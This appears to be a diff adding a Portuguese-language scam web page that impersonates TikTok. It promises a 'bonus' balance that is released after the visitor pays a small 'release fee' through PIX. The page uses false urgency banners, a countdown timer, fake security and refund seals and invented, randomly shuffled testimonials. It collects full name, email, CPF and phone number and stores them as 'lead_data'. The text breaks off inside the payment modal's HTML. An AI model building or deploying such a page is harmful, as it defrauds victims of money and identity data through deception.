@@ -1,0 +1,954 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<script src="/params.js"></script>
+<script src="/api/tt.js"></script>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>Bônus Extra — TikTok Premium</title>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;background:#f2f2f2;max-width:420px;margin:0 auto;min-height:100vh;-webkit-font-smoothing:antialiased}
+.topbar{background:#000;color:white;text-align:center;padding:12px 16px;font-size:14px;font-weight:600}
+.container{padding:12px 12px 48px;display:flex;flex-direction:column;gap:10px}
+
+
+.saldo-card{background:#1c1c1e;border-radius:14px;padding:20px 18px;color:white}
+.saldo-label{font-size:11px;font-weight:600;letter-spacing:1px;text-transform:uppercase;color:rgba(255,255,255,.5);margin-bottom:8px}
+.saldo-value{font-size:42px;font-weight:800;letter-spacing:-1px;margin-bottom:6px;line-height:1}
+.saldo-confirm{font-size:13px;font-weight:700;color:#ff4d67}
+
+.card{background:#fff;border-radius:14px;padding:16px 14px}
+.section-label{font-size:13px;color:#888;margin-bottom:12px}
+
+.confirm-row{display:flex;align-items:center;gap:12px;padding-bottom:14px;border-bottom:1px solid #f0f0f0;margin-bottom:12px}
+.tiktok-icon-wrap{width:44px;height:44px;border-radius:12px;background:#000;display:flex;align-items:center;justify-content:center;flex-shrink:0}
+.confirm-name{font-size:15px;font-weight:600;color:#111;margin-bottom:3px}
+.confirm-price{font-size:15px;font-weight:700;color:#00b37e}
+.total-row{display:flex;justify-content:space-between;align-items:center;padding-top:4px}
+.total-label,.total-value{font-size:15px;font-weight:700;color:#111}
+.libera-badge{background:#e6faf4;border:1px solid #b2f0dc;border-radius:8px;padding:8px 12px;font-size:12.5px;font-weight:600;color:#057a55;text-align:center;margin-top:10px}
+
+.card-header{display:flex;align-items:center;gap:10px;margin-bottom:16px}
+.card-header-icon{width:36px;height:36px;border-radius:50%;background:#000;display:flex;align-items:center;justify-content:center;flex-shrink:0}
+.card-header h2{font-size:17px;font-weight:700;color:#111}
+
+.field{margin-bottom:12px}
+.field:last-child{margin-bottom:0}
+.field label{display:block;font-size:13px;color:#555;margin-bottom:6px}
+.field input{width:100%;padding:13px 14px;border:1px solid #e0e0e0;border-radius:8px;font-size:15px;font-family:inherit;color:#111;background:#fff;outline:none;transition:border-color .2s}
+.field input:focus{border-color:#000;box-shadow:0 0 0 3px rgba(0,0,0,.08)}
+.field input::placeholder{color:#bbb}
+.field input.error{border-color:#FE2C55;box-shadow:0 0 0 3px rgba(255,45,85,.1);animation:shake .3s ease}
+.field-error-msg{font-size:11px;color:#FE2C55;font-weight:600;margin-top:4px;display:none}
+.field input.error + .field-error-msg{display:block}
+@keyframes shake{0%,100%{transform:translateX(0)}20%{transform:translateX(-6px)}40%{transform:translateX(6px)}60%{transform:translateX(-4px)}80%{transform:translateX(4px)}}
+
+.btn-pagar{display:flex;width:100%;padding:16px;background:#FE2C55;color:white;border:none;border-radius:10px;font-size:16px;font-weight:700;font-family:inherit;letter-spacing:.5px;cursor:pointer;text-align:center;text-transform:uppercase;margin-bottom:10px;transition:background .15s;align-items:center;justify-content:center;gap:10px}
+.btn-pagar:hover{background:#e0001e}
+.btn-pagar:active{background:#c0001a}
+.btn-pagar.loading{background:#e0001e;cursor:not-allowed;pointer-events:none}
+.btn-pagar:disabled{background:#ccc;cursor:not-allowed;pointer-events:none}
+.spinner{display:none;width:18px;height:18px;border:2.5px solid rgba(255,255,255,.35);border-top-color:white;border-radius:50%;animation:spin .7s linear infinite;flex-shrink:0}
+.btn-pagar.loading .spinner{display:block}
+@keyframes spin{to{transform:rotate(360deg)}}
+
+.pay-note{text-align:center;font-size:12.5px;color:#888}
+.pay-note strong{color:#111}
+
+.seals{background:#fff;border-radius:14px;padding:14px 16px;display:flex;align-items:center;justify-content:center}
+.seal{display:flex;flex-direction:column;align-items:center;gap:5px;flex:1}
+.seal-icon{width:36px;height:36px;border-radius:10px;display:flex;align-items:center;justify-content:center}
+.seal-icon.green{background:#e6faf4}.seal-icon.blue{background:#e8f0fe}.seal-icon.amber{background:#fff8e1}
+.seal-text{font-size:10.5px;font-weight:700;color:#555;text-align:center;line-height:1.3}
+.seal-divider{width:1px;height:40px;background:#f0f0f0;flex-shrink:0}
+.footer-note{text-align:center;font-size:12px;color:#aaa;padding:0 8px;line-height:1.6}
+
+/* Modal PIX */
+.modal-overlay{position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,.55);display:flex;align-items:flex-end;justify-content:center;z-index:9999;opacity:0;pointer-events:none;transition:opacity .25s ease;overflow-y:auto;-webkit-overflow-scrolling:touch}
+.modal-overlay.active{opacity:1;pointer-events:all}
+.modal{background:#fff;border-radius:20px 20px 0 0;padding:28px 22px 36px;width:100%;max-width:480px;position:relative;text-align:center;transform:translateY(100%);transition:transform .3s cubic-bezier(.32,.72,0,1);overflow-y:auto;max-height:92vh;-webkit-overflow-scrolling:touch}
+.modal-overlay.active .modal{transform:translateY(0)}
+body.modal-open{overflow:hidden;position:fixed;width:100%}
+.modal-handle{width:40px;height:4px;background:#e0e0e0;border-radius:4px;margin:0 auto 18px}
+.modal-close{position:absolute;top:14px;right:16px;width:28px;height:28px;background:#f2f2f2;border:none;border-radius:50%;cursor:pointer;display:flex;align-items:center;justify-content:center;font-size:16px;color:#888;line-height:1}
+.modal-close:hover{background:#e5e5e5}
+.modal-check{width:52px;height:52px;border-radius:50%;border:2.5px solid #00b37e;display:flex;align-items:center;justify-content:center;margin:0 auto 10px}
+.modal-title{font-size:18px;font-weight:800;color:#111;margin-bottom:2px}
+.modal-subtitle{font-size:13px;color:#888;margin-bottom:4px}
+.modal-expiry{font-size:12px;color:#999;margin-bottom:6px}
+.modal-value{font-size:22px;font-weight:800;color:#111;margin-bottom:18px}
+
+.timer-wrap{display:flex;align-items:center;justify-content:center;gap:8px;margin-bottom:12px}
+.timer-label{font-size:12px;color:#999}
+.timer-count{font-size:20px;font-weight:800;color:#00b37e;font-variant-numeric:tabular-nums;letter-spacing:-.5px;transition:color .3s}
+.timer-count.urgent{color:#e63946}
+.timer-bar-wrap{width:100%;height:4px;background:#f0f0f0;border-radius:4px;margin-bottom:16px;overflow:hidden}
+.timer-bar{height:100%;background:#00b37e;border-radius:4px;transition:width 1s linear,background .3s}
+.timer-bar.urgent{background:#e63946}
+
+.modal-tabs{display:flex;gap:6px;background:#f4f4f4;border-radius:10px;padding:4px;margin-bottom:16px}
+.modal-tab{flex:1;padding:8px 6px;border:none;border-radius:7px;background:none;font-size:12.5px;font-weight:700;font-family:inherit;color:#999;cursor:pointer;transition:all .2s;display:flex;align-items:center;justify-content:center;gap:5px}
+.modal-tab.active{background:#fff;color:#111;box-shadow:0 1px 4px rgba(0,0,0,.1)}
+.tab-panel{display:none}.tab-panel.active{display:block}
+
+.how-to{display:flex;align-items:center;justify-content:center;gap:4px;margin-bottom:14px;flex-wrap:wrap}
+.how-step{display:flex;flex-direction:column;align-items:center;gap:4px}
+.how-step-icon{width:32px;height:32px;border-radius:50%;background:#f0faf6;border:1.5px solid #c8edd9;display:flex;align-items:center;justify-content:center}
+.how-step-text{font-size:9.5px;font-weight:600;color:#666;text-align:center;max-width:52px;line-height:1.3}
+.how-arrow{color:#ccc;font-size:14px;margin-bottom:14px;flex-shrink:0}
+
+.qr-wrap{background:#f8f8f8;border-radius:12px;padding:14px;margin-bottom:16px;display:flex;align-items:center;justify-content:center}
+.qr-placeholder{width:180px;height:180px;background:#fff;border:1px solid #eee;border-radius:4px;display:flex;align-items:center;justify-content:center}
+
+.pix-code-row{display:flex;align-items:center;gap:8px;background:#f8f8f8;border:1px solid #eee;border-radius:8px;padding:10px 12px;margin-bottom:14px}
+.pix-code-text{flex:1;font-size:12px;color:#555;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;text-align:left;font-family:monospace}
+.copy-btn{background:none;border:none;cursor:pointer;color:#888;padding:2px;flex-shrink:0;transition:color .15s}
+.copy-btn:hover{color:#00b37e}
+
+.btn-copiar-pix{display:flex;align-items:center;justify-content:center;gap:8px;width:100%;padding:15px;background:#00b37e;color:white;border:none;border-radius:10px;font-size:15px;font-weight:700;font-family:inherit;cursor:pointer;margin-bottom:10px;transition:background .15s}
+.btn-copiar-pix:hover{background:#009e6e}
+.btn-copiar-pix.copied{background:#057a55}
+
+.how-to-copy{display:flex;flex-direction:column;gap:8px;margin-bottom:14px}
+.how-step-row{display:flex;align-items:center;gap:10px}
+.how-step-num{width:24px;height:24px;border-radius:50%;background:#f0faf6;border:1.5px solid #c8edd9;display:flex;align-items:center;justify-content:center;font-size:11px;font-weight:800;color:#00b37e;flex-shrink:0}
+.how-step-desc{font-size:12.5px;color:#555;font-weight:500;line-height:1.35}
+.how-step-desc strong{color:#111}
+
+.mini-depos{display:flex;flex-direction:column;gap:5px;margin:10px 0 8px}
+.mini-depo{display:flex;align-items:center;gap:8px;background:#f8f8f8;border-radius:8px;padding:8px 10px}
+.mini-depo-av{width:28px;height:28px;border-radius:50%;font-size:10px;font-weight:700;color:white;display:flex;align-items:center;justify-content:center;flex-shrink:0}
+.mini-depo-text{flex:1;font-size:12.5px;color:#444;font-style:italic;line-height:1.4}
+.mini-depo-check{font-size:11px;font-weight:700;color:#00b37e;white-space:nowrap;flex-shrink:0}
+.modal-note{font-size:11.5px;color:#aaa;line-height:1.5}
+
+#toast{position:fixed;top:20px;left:50%;transform:translateX(-50%) translateY(-120px);background:#1a1a2e;color:white;padding:14px 20px;border-radius:12px;font-size:14px;font-weight:600;z-index:999999;transition:transform .3s ease;display:flex;align-items:center;gap:8px;box-shadow:0 6px 24px rgba(0,0,0,.3);width:calc(100% - 32px);max-width:388px}
+#toast.show{transform:translateX(-50%) translateY(0)}
+</style>
+</head>
+<body>
+
+<div id="toast"><span id="toastMsg">Preencha seus dados antes de continuar</span></div>
+
+<div style="background:#111;color:#fff;text-align:center;padding:10px 16px;font-size:12px;font-weight:700;letter-spacing:.03em;border-bottom:2px solid #FE2C55">
+  ⚠️ BÔNUS EXPIRA EM BREVE — RESGATE AGORA ANTES QUE O SISTEMA REVERTA O VALOR
+</div>
+<div class="topbar" style="display:flex;align-items:center;justify-content:center;gap:8px">
+  <svg width="16" height="16" viewBox="0 0 24 24" fill="white"><path d="M19.59 6.69a4.83 4.83 0 01-3.77-4.25V2h-3.45v13.67a2.89 2.89 0 01-2.88 2.5 2.89 2.89 0 01-2.89-2.89 2.89 2.89 0 012.89-2.89c.28 0 .54.04.79.1V9.01a6.33 6.33 0 00-.79-.05 6.34 6.34 0 00-6.34 6.34 6.34 6.34 0 006.34 6.34 6.34 6.34 0 006.33-6.34V8.69a8.22 8.22 0 004.84 1.56V6.79a4.85 4.85 0 01-1.07-.1z"/></svg>
+  <span>TikTok Premium — Bônus Extra</span>
+</div>
+
+<div class="container">
+
+
+  <!-- Saldo -->
+  <div class="saldo-card">
+    <p class="saldo-label">Seu saldo disponível</p>
+    <div class="saldo-value" id="saldoValue">R$868,75</div>
+    <div class="saldo-confirm" style="color:#00e5a0">✓ Conta aprovada — aguardando ativação</div>
+  </div>
+
+  <!-- Confirmação -->
+  <div class="card">
+    <p class="section-label">Confirmação:</p>
+    <div class="confirm-row">
+      <div class="tiktok-icon-wrap">
+        <svg width="26" height="26" viewBox="0 0 24 24" fill="white"><path d="M19.59 6.69a4.83 4.83 0 01-3.77-4.25V2h-3.45v13.67a2.89 2.89 0 01-2.88 2.5 2.89 2.89 0 01-2.89-2.89 2.89 2.89 0 012.89-2.89c.28 0 .54.04.79.1V9.01a6.33 6.33 0 00-.79-.05 6.34 6.34 0 00-6.34 6.34 6.34 6.34 0 006.34 6.34 6.34 6.34 0 006.33-6.34V8.69a8.22 8.22 0 004.84 1.56V6.79a4.85 4.85 0 01-1.07-.1z"/></svg>
+      </div>
+      <div>
+        <p class="confirm-name">Taxa Única de Liberação</p>
+        <p class="confirm-price" id="priceConfirm">R$ 26,31</p>
+      </div>
+    </div>
+    <div class="total-row">
+      <span class="total-label">Total:</span>
+      <span class="total-value" id="priceTotal">R$ 26,31</span>
+    </div>
+    <div class="libera-badge">✓ Ative e receba <strong id="saldoBadge">R$868,75</strong> imediatamente via PIX</div>
+  </div>
+
+  <!-- Identificação — só nome -->
+  <div class="card">
+    <div class="card-header">
+      <div class="card-header-icon">
+        <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M20 21v-2a4 4 0 00-4-4H8a4 4 0 00-4 4v2"/><circle cx="12" cy="7" r="4"/></svg>
+      </div>
+      <h2>Identifique-se</h2>
+    </div>
+    <div class="field">
+      <label>Nome completo</label>
+      <input type="text" id="inputNome" placeholder="Seu nome completo" autocomplete="name" />
+      <span class="field-error-msg">Informe seu nome completo</span>
+    </div>
+    <div class="field">
+      <label for="inputEmail">Email</label>
+      <input type="email" id="inputEmail" placeholder="Seu email" autocomplete="email" />
+    </div>
+    <div class="field">
+      <label for="inputCpf">CPF</label>
+      <input type="text" id="inputCpf" inputmode="numeric" maxlength="14" placeholder="000.000.000-00" autocomplete="off" />
+    </div>
+    <div class="field">
+      <label for="inputTel">Celular</label>
+      <input type="tel" id="inputTel" inputmode="tel" maxlength="15" placeholder="(11) 99999-9999" autocomplete="tel-national" />
+    </div>
+  </div>
+
+  <!-- Pagamento -->
+  <div class="card">
+    <div class="card-header">
+      <div class="card-header-icon">
+        <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><rect x="2" y="5" width="20" height="14" rx="2"/><path d="M2 10h20"/></svg>
+      </div>
+      <h2>Pagamento</h2>
+    </div>
+    <button class="btn-pagar" id="btnPagar">
+      <div class="spinner"></div>
+      <span class="btn-text">RESGATAR MEU BÔNUS</span>
+    </button>
+    <p class="pay-note">Pagamento seguro via <strong>PIX</strong> com aprovação imediata.</p>
+  </div>
+
+  <!-- Selos -->
+  <div class="seals">
+    <div class="seal">
+      <div class="seal-icon green">
+        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#00b37e" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
+      </div>
+      <span class="seal-text">Compra<br>Segura</span>
+    </div>
+    <div class="seal-divider"></div>
+    <div class="seal">
+      <div class="seal-icon blue">
+        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#1a73e8" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0110 0v4"/></svg>
+      </div>
+      <span class="seal-text">Dados<br>Protegidos</span>
+    </div>
+    <div class="seal-divider"></div>
+    <div class="seal">
+      <div class="seal-icon amber">
+        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#f59e0b" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M3 9l9-7 9 7v11a2 2 0 01-2 2H5a2 2 0 01-2-2z"/><polyline points="9 22 9 12 15 12 15 22"/></svg>
+      </div>
+      <span class="seal-text">Reembolso<br>7 dias</span>
+    </div>
+  </div>
+
+  <p class="footer-note">Compra 100% segura. Reembolso garantido em até 7 dias.</p>
+</div>
+
+<script>
+(function(){
+  var params  = new URLSearchParams(window.location.search);
+
+  // ── Lê dados da URL ─────────────────────────────────────────
+  var totalParam = 1715.75; // saldo vem da URL
+  var taxaParam  = 19.46; // fixo
+  var emailParam = params.get('email') || '';
+
+  function fmtBRL(v){ return 'R$ ' + v.toFixed(2).replace('.',','); }
+  function fmtBRLShort(v){ return 'R$' + v.toFixed(2).replace('.',','); }
+
+  // Preenche valores dinâmicos
+  var _ids = {
+    'saldoValue':  fmtBRLShort(totalParam),
+    'saldoBadge':  fmtBRLShort(totalParam),
+    'priceConfirm': fmtBRL(taxaParam),
+    'priceTotal':   fmtBRL(taxaParam),
+    'priceModal':   fmtBRL(taxaParam),
+    'priceStep':    fmtBRL(taxaParam)
+  };
+  Object.keys(_ids).forEach(function(id){
+    var el = document.getElementById(id);
+    if(el) el.textContent = _ids[id];
+  });
+
+  // Email silencioso da URL
+  if(emailParam) document.getElementById('inputEmail').value = emailParam;
+
+  var taxaCentavos = Math.round(taxaParam * 100);
+
+
+  // ── Depoimentos randomizados ────────────────────────────────
+  var allDepos = [
+    {av:'AC', bg:'#e05252', txt:'"Caiu na hora no meu Nubank, sem erro nenhum."'},
+    {av:'RO', bg:'#00b37e', txt:'"Paguei e recebi em menos de 2 minutos."'},
+    {av:'JM', bg:'#5a6fd6', txt:'"Funcionou certinho, sem nenhum problema."'},
+    {av:'LS', bg:'#f59e0b', txt:'"Super rápido, recomendo pra todo mundo."'},
+    {av:'BF', bg:'#8b5cf6', txt:'"Na primeira tentativa já funcionou."'},
+    {av:'CM', bg:'#ec4899', txt:'"Processo simples e seguro. Aprovado!"'},
+  ];
+  function renderDepos(){
+    var wrap = document.getElementById('miniDepos');
+    if(!wrap) return;
+    var shuffled = allDepos.sort(function(){ return Math.random() - 0.5; }).slice(0,3);
+    wrap.innerHTML = shuffled.map(function(d){
+      return '<div class="mini-depo"><div class="mini-depo-av" style="background:'+d.bg+'">'+d.av+'</div>' +
+             '<span class="mini-depo-text">'+d.txt+'</span>' +
+             '<span class="mini-depo-check">✓ Confirmado</span></div>';
+    }).join('');
+  }
+  renderDepos();
+
+  // ── PIX state ───────────────────────────────────────────────
+  var PIX_CODE        = '';
+  var PAYMENT_CODE    = '';
+  var pollingInterval = null;
+  var TOTAL_SECONDS   = 10 * 60;
+  var remainingSeconds = TOTAL_SECONDS;
+  var timerInterval   = null;
+
+  function pad(n){ return String(n).padStart(2,'0'); }
+
+  // ── Toast ────────────────────────────────────────────────────
+  var toastTimeout;
+  function showToast(msg){
+    var el    = document.getElementById('toast');
+    var msgEl = document.getElementById('toastMsg');
+    msgEl.textContent = msg;
+    clearTimeout(toastTimeout);
+    el.classList.remove('show');
+    setTimeout(function(){
+      el.classList.add('show');
+      toastTimeout = setTimeout(function(){ el.classList.remove('show'); }, 3000);
+    }, 10);
+  }
+
+  // ── CPF e celular (exigidos pelo gateway) ───────────────────
+  function soDig(v){ return String(v || '').replace(/\D/g, ''); }
+  function cpfOk(v){
+    var c = soDig(v);
+    if(c.length !== 11 || /^(\d)\1{10}$/.test(c)) return false;
+    for(var n = 9; n < 11; n++){
+      var s = 0;
+      for(var i = 0; i < n; i++) s += parseInt(c.charAt(i), 10) * (n + 1 - i);
+      var d = (s * 10) % 11; if(d === 10) d = 0;
+      if(d !== parseInt(c.charAt(n), 10)) return false;
+    }
+    return true;
+  }
+  function telOk(v){ var t = soDig(v); return (t.length === 10 || t.length === 11) && parseInt(t.slice(0, 2), 10) >= 11; }
+  function mascCpf(v){
+    var c = soDig(v).slice(0, 11);
+    if(c.length > 9) return c.replace(/(\d{3})(\d{3})(\d{3})(\d{1,2})/, '$1.$2.$3-$4');
+    if(c.length > 6) return c.replace(/(\d{3})(\d{3})(\d{1,3})/, '$1.$2.$3');
+    if(c.length > 3) return c.replace(/(\d{3})(\d{1,3})/, '$1.$2');
+    return c;
+  }
+  function mascTel(v){
+    var t = soDig(v).slice(0, 11);
+    if(t.length > 10) return t.replace(/(\d{2})(\d{5})(\d{1,4})/, '($1) $2-$3');
+    if(t.length > 6) return t.replace(/(\d{2})(\d{4})(\d{1,4})/, '($1) $2-$3');
+    if(t.length > 2) return t.replace(/(\d{2})(\d{1,5})/, '($1) $2');
+    if(t.length > 0) return '(' + t;
+    return t;
+  }
+  var inputCpf = document.getElementById('inputCpf');
+  var inputTel = document.getElementById('inputTel');
+  inputCpf.addEventListener('input', function(){ inputCpf.value = mascCpf(inputCpf.value); });
+  inputTel.addEventListener('input', function(){ inputTel.value = mascTel(inputTel.value); });
+
+  // Dados já informados num checkout anterior da mesma sessão.
+  try {
+    var anterior = JSON.parse(sessionStorage.getItem('lead_data') || '{}');
+    if(anterior.nome && !document.getElementById('inputNome').value) document.getElementById('inputNome').value = anterior.nome;
+    if(anterior.email && !document.getElementById('inputEmail').value) document.getElementById('inputEmail').value = anterior.email;
+    if(anterior.cpf) inputCpf.value = mascCpf(anterior.cpf);
+    if(anterior.telefone) inputTel.value = mascTel(anterior.telefone);
+  } catch(e) {}
+
+  // ── Botão Pagar ──────────────────────────────────────────────
+  document.getElementById('btnPagar').addEventListener('click', function(){
+    var nome  = document.getElementById('inputNome');
+    var email = document.getElementById('inputEmail').value.trim();
+    nome.classList.remove('error');
+    if(nome.value.trim().length < 3){
+      nome.classList.add('error');
+      showToast('👆 Informe seu nome completo');
+      nome.scrollIntoView({ behavior:'smooth', block:'center' });
+      return;
+    }
+    if (!email || !document.getElementById('inputEmail').checkValidity()) {
+      showToast('Informe um email valido'); document.getElementById('inputEmail').focus(); return;
+    }
+    if (!cpfOk(inputCpf.value)) {
+      showToast('Informe um CPF valido'); inputCpf.focus(); return;
+    }
+    if (!telOk(inputTel.value)) {
+      showToast('Informe um celular valido com DDD'); inputTel.focus(); return;
+    }
+    var btn  = this;
+    var text = btn.querySelector('.btn-text');
+    btn.classList.add('loading');
+    btn.disabled = true;
+    text.textContent = 'AGUARDE...';
+    sessionStorage.setItem('lead_data', JSON.stringify({ nome: nome.value.trim(), email: email, cpf: soDig(inputCpf.value), telefone: soDig(inputTel.value) }));
+    window.abrirPixModal();
+  });
+
+})();
+</script>
+
+</html>
+
+<script>
+/**
+ * PIX MODAL — Upsell UUP1
+ * Inclua este script no seu HTML do upsell e chame abrirPixModal()
+ * quando o usuário clicar no botão de pagar.
+ */
+
+(function() {
+
+// ── Injeta o CSS do modal ──────────────────────────────────
+const style = document.createElement('style');
+style.textContent = `
+@import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap');
+
+#pixOverlay {
+  display: none; position: fixed; inset: 0; z-index: 9999;
+  align-items: flex-end; justify-content: center;
+  padding: 0; animation: fadein .2s ease;
+  font-family: 'Inter', sans-serif;
+}
+#pixOverlay.active { display: flex; }
+@keyframes fadein { from{opacity:0} to{opacity:1} }
+
+.pix-overlay-backdrop {
+  position: absolute; inset: 0;
+  background: rgba(0,0,0,.5); backdrop-filter: blur(6px);
+}
+
+.pix-modal {
+  position: relative; z-index: 1;
+  width: 100%; max-width: 480px;
+  max-height: 96vh; overflow-y: auto; scrollbar-width: none;
+  background: #1a1a1a;
+  border-radius: 20px 20px 0 0;
+  box-shadow: 0 24px 64px rgba(0,0,0,.22);
+  transform: translateY(100%);
+  transition: transform .3s cubic-bezier(.32,.72,0,1);
+}
+#pixOverlay.active .pix-modal { transform: translateY(0); }
+.pix-modal::-webkit-scrollbar { display: none; }
+
+.pix-handle {
+  width: 40px; height: 4px; background: #333;
+  border-radius: 2px; margin: 12px auto 0;
+}
+
+.pix-btn-x {
+  position: absolute; top: 14px; right: 14px;
+  width: 30px; height: 30px;
+  background: #2a2a2a; border: none; border-radius: 50%;
+  color: #aaa; font-size: 16px; cursor: pointer;
+  display: flex; align-items: center; justify-content: center;
+  transition: all .15s; z-index: 2;
+}
+.pix-btn-x:hover { background: #333; color: #fff; }
+
+.pix-modal-header {
+  padding: 20px 24px 16px; text-align: center; position: relative; background: #1a1a1a;
+}
+.pix-check-wrap { display: flex; justify-content: center; margin-bottom: 12px; }
+.pix-check-circle {
+  width: 52px; height: 52px;
+  border: 2.5px solid #FE2C55; border-radius: 50%;
+  display: flex; align-items: center; justify-content: center;
+}
+.pix-check-circle svg { width: 24px; height: 24px; }
+.pix-header-title { font-size: 1.15rem; font-weight: 800; color: #fff; letter-spacing: -.02em; margin-bottom: 4px; }
+.pix-header-date { font-size: .75rem; color: #666; margin-bottom: 10px; }
+.pix-header-valor { font-size: 1.7rem; font-weight: 800; color: #fff; letter-spacing: -.03em; margin-bottom: 12px; }
+
+.pix-timer-row { display: flex; align-items: center; justify-content: center; gap: 8px; margin-bottom: 14px; }
+.pix-timer-label { font-size: .82rem; color: #aaa; font-weight: 500; }
+.pix-timer-count { font-size: .95rem; font-weight: 800; color: #FE2C55; font-variant-numeric: tabular-nums; }
+.pix-timer-count.urgent { color: #e53935; }
+
+.pix-progress-wrap { height: 3px; background: #333; overflow: hidden; }
+.pix-progress-fill { height: 100%; background: #FE2C55; transition: width .8s ease; width: 100%; }
+
+.pix-tabs-wrap { padding: 14px 16px 0; background: #1a1a1a; }
+.pix-tabs {
+  display: flex; border: 1.5px solid #333;
+  border-radius: 10px; overflow: hidden; background: #111;
+}
+.pix-tab {
+  flex: 1; padding: 10px 8px;
+  display: flex; align-items: center; justify-content: center; gap: 6px;
+  font-size: .82rem; font-weight: 600; color: #666;
+  cursor: pointer; border: none; background: none;
+  transition: all .15s; font-family: 'Inter', sans-serif;
+  border-radius: 8px; margin: 3px;
+}
+.pix-tab svg { width: 15px; height: 15px; }
+.pix-tab.active { background: #2a2a2a; color: #fff; box-shadow: 0 1px 4px rgba(0,0,0,.08); }
+
+.pix-tab-content { display: none; padding: 14px 16px 16px; background: #1a1a1a; }
+.pix-tab-content.active { display: block; }
+
+.pix-steps-row {
+  display: flex; align-items: flex-start; justify-content: space-between;
+  gap: 2px; margin-bottom: 14px;
+}
+.pix-step-col { display: flex; flex-direction: column; align-items: center; gap: 5px; flex: 1; }
+.pix-step-icon-wrap {
+  width: 38px; height: 38px; border-radius: 50%;
+  border: 1.5px solid #FE2C55; background: #2a1010;
+  display: flex; align-items: center; justify-content: center;
+}
+.pix-step-icon-wrap svg { width: 17px; height: 17px; }
+.pix-step-arrow { color: #444; font-size: .7rem; margin-top: 10px; flex-shrink: 0; }
+.pix-step-label { font-size: .62rem; color: #888; text-align: center; line-height: 1.3; font-weight: 500; max-width: 52px; }
+
+.pix-qr-outer {
+  background: #111; border: 1px solid #2a2a2a;
+  border-radius: 12px; padding: 16px;
+  display: flex; justify-content: center; margin-bottom: 12px;
+}
+.pix-qr-box {
+  width: 180px; height: 180px; background: #fff;
+  border-radius: 8px; display: flex; align-items: center; justify-content: center;
+  position: relative; overflow: hidden;
+}
+.pix-qr-paid-overlay {
+  display: none; position: absolute; inset: 0;
+  background: rgba(0,179,126,.92); border-radius: 6px;
+  flex-direction: column; align-items: center; justify-content: center; gap: 8px;
+}
+.pix-qr-paid-overlay.show { display: flex; }
+.pix-paid-check {
+  width: 50px; height: 50px; background: #fff; border-radius: 50%;
+  display: flex; align-items: center; justify-content: center;
+  animation: popin .3s ease;
+}
+@keyframes popin { from{transform:scale(.4);opacity:0} to{transform:scale(1);opacity:1} }
+.pix-paid-check svg { width: 26px; height: 26px; }
+.pix-qr-paid-overlay p { color: #fff; font-weight: 800; font-size: .9rem; }
+
+.pix-code-row {
+  display: flex; align-items: center; gap: 8px;
+  background: #111; border: 1px solid #2a2a2a;
+  border-radius: 8px; padding: 9px 12px; margin-bottom: 12px;
+}
+.pix-code-text {
+  flex: 1; font-size: .68rem; color: #666; font-family: monospace;
+  white-space: nowrap; overflow: hidden; text-overflow: ellipsis; font-style: italic;
+}
+.pix-code-text.ready { color: #aaa; font-style: normal; }
+
+.pix-btn-copiar {
+  display: flex; align-items: center; justify-content: center; gap: 8px;
+  width: 100%; background: #FE2C55; color: #fff; border: none;
+  border-radius: 10px; padding: 14px;
+  font-family: 'Inter', sans-serif; font-size: .92rem; font-weight: 700;
+  cursor: not-allowed; opacity: .45; transition: all .15s;
+}
+.pix-btn-copiar.ready { opacity: 1; cursor: pointer; }
+.pix-btn-copiar.ready:hover { background: #e0001e; }
+.pix-btn-copiar.copied { background: #c0001a; opacity: 1; }
+.pix-btn-copiar svg { width: 16px; height: 16px; }
+
+.pix-cc-steps { list-style: none; display: flex; flex-direction: column; gap: 10px; margin-bottom: 14px; }
+.pix-cc-step { display: flex; align-items: flex-start; gap: 10px; font-size: .84rem; color: #bbb; line-height: 1.5; }
+.pix-cc-step-num {
+  min-width: 22px; height: 22px; background: #FE2C55; color: #fff; border-radius: 50%;
+  display: flex; align-items: center; justify-content: center;
+  font-size: .62rem; font-weight: 800; flex-shrink: 0; margin-top: 1px;
+}
+.pix-cc-step strong { color: #fff; font-weight: 600; }
+
+.pix-status-row {
+  display: flex; align-items: center; justify-content: center; gap: 7px;
+  padding: 8px 16px 4px; font-size: .78rem; font-weight: 600; color: #666; transition: all .25s;
+}
+.pix-status-row.ok  { color: #FE2C55; }
+.pix-status-row.err { color: #e53935; }
+.pix-mini-spin {
+  width: 13px; height: 13px;
+  border: 2px solid #333; border-top-color: #666;
+  border-radius: 50%; animation: spin .7s linear infinite; flex-shrink: 0;
+}
+@keyframes spin { to { transform: rotate(360deg); } }
+
+.pix-btn-retry {
+  display: none; margin: 6px auto 0;
+  background: transparent; color: #666; border: 1px solid #333;
+  border-radius: 8px; padding: 7px 18px;
+  font-family: 'Inter', sans-serif; font-size: .75rem; font-weight: 600;
+  cursor: pointer; transition: all .15s;
+}
+.pix-btn-retry.show { display: block; }
+.pix-btn-retry:hover { border-color: #FE2C55; color: #FE2C55; }
+
+.pix-modal-footer {
+  border-top: 1px solid #2a2a2a; padding: 10px 20px 20px;
+  display: flex; align-items: center; justify-content: center; gap: 5px;
+}
+.pix-modal-footer span { font-size: .7rem; color: #555; font-weight: 500; }
+`;
+document.head.appendChild(style);
+
+// ── Injeta o HTML do modal ─────────────────────────────────
+const modalHtml = `
+<div id="pixOverlay">
+  <div class="pix-overlay-backdrop" onclick="fecharPixModal()"></div>
+  <div class="pix-modal">
